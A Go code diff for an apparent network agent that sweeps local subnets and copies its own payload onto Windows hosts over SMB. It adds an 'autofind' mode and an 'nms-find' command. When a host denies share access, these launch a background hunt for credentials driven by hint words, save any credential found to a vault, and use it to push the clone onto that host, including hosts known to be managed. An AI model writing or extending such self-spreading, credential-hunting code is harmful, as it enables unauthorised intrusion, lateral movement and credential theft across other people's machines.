@@ -353,7 +353,12 @@ type NMSConfig struct {
 	AutoClone     bool     `json:"autoclone"`
 	// AutoForce extends the auto arm to managed-unknown hosts (default
 	// off - explicit opt-in per NMS; unknown stays skipped otherwise).
-	AutoForce     bool `json:"autoforce"`
+	AutoForce bool `json:"autoforce"`
+	// AutoFind lets the clone arm DISCOVER a credential for managed-unknown
+	// hosts (background finder job, vault cred on success; default off).
+	AutoFind bool `json:"autofind"`
+	// FindHints are evidence words handed to the finder (names, words).
+	FindHints  []string `json:"find_hints"`
 	MaxParallel   int  `json:"max_parallel"`
 	FailThreshold int  `json:"fail_threshold"`
 	FailWindowMin int  `json:"fail_window_min"`
@@ -406,6 +411,10 @@ func LoadNMSConfig() NMSConfig {
 	}
 	cfg.AutoClone = f.AutoClone
 	cfg.AutoForce = f.AutoForce
+	cfg.AutoFind = f.AutoFind
+	if f.FindHints != nil {
+		cfg.FindHints = f.FindHints
+	}
 	if f.MaxParallel >= 1 && f.MaxParallel <= 32 {
 		cfg.MaxParallel = f.MaxParallel
 	}
@@ -441,12 +450,18 @@ func SetNMS(args string, seedExclude []string) (string, error) {
 			cfg.Exclude = append(cfg.Exclude, seed)
 		}
 	}
-	fields := strings.Fields(strings.ReplaceAll(args, ",", " "))
+	// Fields are whitespace-separated key=value pairs. Commas are NOT
+	// rewritten to spaces first: list keys (subnets, extra_hosts,
+	// exclude, find_hints) take comma-separated values inside ONE field
+	// ("find_hints=a,b"), which the old comma->space rewrite silently
+	// broke (the second list item arrived as a bare token and tripped the
+	// usage error, capping every list at one value).
+	fields := strings.Fields(args)
 	var applied []string
 	for _, f := range fields {
 		kv := strings.SplitN(f, "=", 2)
 		if len(kv) != 2 {
-			return "", fmt.Errorf("usage: set-nms key=value [key=value...] (interval, sweep_min, subnets, extra_hosts, exclude, autoclone, autoforce, max_parallel, fail_threshold, fail_window_min, rearm_min)")
+			return "", fmt.Errorf("usage: set-nms key=value [key=value...] (interval, sweep_min, subnets, extra_hosts, exclude, autoclone, autoforce, autofind, find_hints, max_parallel, fail_threshold, fail_window_min, rearm_min)")
 		}
 		k := strings.ToLower(strings.TrimSpace(kv[0]))
 		v := strings.TrimSpace(kv[1])
@@ -489,6 +504,16 @@ func SetNMS(args string, seedExclude []string) (string, error) {
 			} else {
 				return "", fmt.Errorf("autoforce must be on|off")
 			}
+		case "autofind", "autofind=on", "autofind=off":
+			if k == "autofind=on" || strings.EqualFold(v, "on") || strings.EqualFold(v, "true") || strings.EqualFold(v, "1") {
+				cfg.AutoFind = true
+			} else if k == "autofind=off" || strings.EqualFold(v, "off") || strings.EqualFold(v, "false") || strings.EqualFold(v, "0") {
+				cfg.AutoFind = false
+			} else {
+				return "", fmt.Errorf("autofind must be on|off")
+			}
+		case "find_hints", "findhints":
+			cfg.FindHints = splitList(v)
 		case "max_parallel":
 			n, err := strconv.Atoi(v)
 			if err != nil || n < 1 || n > 32 {
@@ -1796,35 +1821,49 @@ func StepNMS(send func(reportJSON string), controllerIPs []string) error {
 				}
 				continue
 			}
-			if r.ManagedUnknown {
-				// Share denied: skip unless auto-force opted in (whole-LAN
-				// force). Proven-managed never reaches here (gated above).
-				if !cfg.AutoForce {
-					r.CloneState = "skip-managed-unknown"
-					r.CloneDetail = "share read denied - refusing to guess"
-					continue
-				}
-				// Fingerprinted non-Windows never auto-clones (an appliance
-				// with open SMB-looking ports still can't run our bytes;
-				// manual --force remains the operator's override).
-				if fpVetoAuto(r.Fingerprint) {
-					r.CloneState = "skip-non-windows"
-					r.CloneDetail = "fingerprinted " + r.Fingerprint + " - not a Windows target"
-					continue
-				}
-				if !ok {
-					r.CloneState = "no-payload"
-					continue
-				}
-				st, started := startCloneJob(r.Host, version.Version, true)
-				r.CloneState = st
-				if started {
-					r.CloneDetail = "auto-forced job started (operator opted in)"
-				} else {
-					r.CloneDetail = "auto-forced job tracked"
+		if r.ManagedUnknown {
+			// Credential-backed attempt: autofind=on WITH a vault cred now
+			// present turns the unknown wall into a vault-identity clone
+			// attempt (the fallback inside CloneToHost authenticates
+			// properly; honest terminal states, breaker untouched).
+			credBacked := cfg.AutoFind && vaultCredsPresent()
+			// Share denied: skip unless auto-force opted in (whole-LAN
+			// force) or a discovered/placed vault cred backs the attempt.
+			// Proven-managed never reaches here (gated above).
+			if !cfg.AutoForce && !credBacked {
+				r.CloneState = "skip-managed-unknown"
+				r.CloneDetail = "share read denied - refusing to guess"
+				// autofind: exactly this wall class gets a background
+				// credential hunt (cfg-gated, deduped, never blocks).
+				if st, started := maybeAutoFind(cfg, r.Host, controllerIPs); started {
+					r.CloneDetail = "share read denied - autofind " + st + " (background credential hunt)"
 				}
 				continue
 			}
+			// Fingerprinted non-Windows never auto-clones (an appliance
+			// with open SMB-looking ports still can't run our bytes;
+			// manual --force remains the operator's override).
+			if fpVetoAuto(r.Fingerprint) {
+				r.CloneState = "skip-non-windows"
+				r.CloneDetail = "fingerprinted " + r.Fingerprint + " - not a Windows target"
+				continue
+			}
+			if !ok {
+				r.CloneState = "no-payload"
+				continue
+			}
+			st, started := startCloneJob(r.Host, version.Version, true)
+			r.CloneState = st
+			switch {
+			case started && credBacked && !cfg.AutoForce:
+				r.CloneDetail = "vault-cred backed job started (autofind)"
+			case started:
+				r.CloneDetail = "auto-forced job started (operator opted in)"
+			default:
+				r.CloneDetail = "auto-forced job tracked"
+			}
+			continue
+		}
 			if !ok {
 				r.CloneState = "no-payload"
 				continue
@@ -2373,13 +2412,18 @@ func NMSHandle(cmd, args string, controllerIPs []string) (string, error) {
 		// with a redirect to their own agent verbs; unknown needs force
 		// like clone (same reinstall-risk class); gates never bypassed.
 		return nmsExecVerb(args, controllerIPs)
+	case "nms-find":
+		// Credential discovery: nms-find <host> [--timeout Sec] [--write].
+		// Same gates as clone/exec EXCEPT the managed veto - a managed box
+		// can still be the one whose credential we lack.
+		return nmsFindVerb(args, controllerIPs)
 	case "nms-scan":
 		// Full-range deep scan, async: nms-scan <host> --confirm YES.
 		// Manual only (never sweep, never auto). Excluded/self/controller
 		// never scan; dark-and-absent hosts refuse (nothing to scan).
 		return nmsScanVerb(args, controllerIPs)
 	default:
-		return "", fmt.Errorf("unknown NMS command: %s (nms-status, nms-now, set-nms, agent-sleep, agent-wake-up, nms-stop, nms-clone, nms-exec, nms-scan)", cmd)
+		return "", fmt.Errorf("unknown NMS command: %s (nms-status, nms-now, set-nms, agent-sleep, agent-wake-up, nms-stop, nms-clone, nms-exec, nms-find, nms-scan)", cmd)
 	}
 }
 
@@ -2545,11 +2589,28 @@ func nmsStatus() string {
 			arm = "paused-breaker"
 		}
 	}
+	autofind := "autofind=off"
+	if cfg.AutoFind {
+		autofind = "autofind=ON (unknowns trigger a background credential hunt)"
+	}
+	findMu.Lock()
+	findStr := ""
+	if n := len(findJobs); n > 0 {
+		var fj []string
+		for h, j := range findJobs {
+			fj = append(fj, h+":"+j.State)
+			if len(fj) >= 3 {
+				break
+			}
+		}
+		findStr = fmt.Sprintf(" find-jobs=%d(%s)", n, strings.Join(fj, ","))
+	}
+	findMu.Unlock()
 	arp := arpSeedHosts()
 	targets := dedupeHosts(append(append(append([]string{}, currentSweep()...), arp...), cfg.ExtraHosts...))
 	priv := CurrentNMSPriv()
-	return fmt.Sprintf("nms tick=%d version=%s interval=%ds agent=%s clone-arm=%s payload=%s targets=%d sweep=%d arp=%d priv=%s/elev=%v/%s admin=%v %s",
+	return fmt.Sprintf("nms tick=%d version=%s interval=%ds agent=%s clone-arm=%s payload=%s targets=%d sweep=%d arp=%d priv=%s/elev=%v/%s admin=%v %s %s%s",
 		NMSTick(), version.Version, cfg.IntervalSec, sleep, arm, payload,
 		len(targets), len(currentSweep()), len(arp),
-		priv.User, priv.Elevated, priv.Integrity, priv.IsAdmin, autoforce)
+		priv.User, priv.Elevated, priv.Integrity, priv.IsAdmin, autoforce, autofind, findStr)
 }
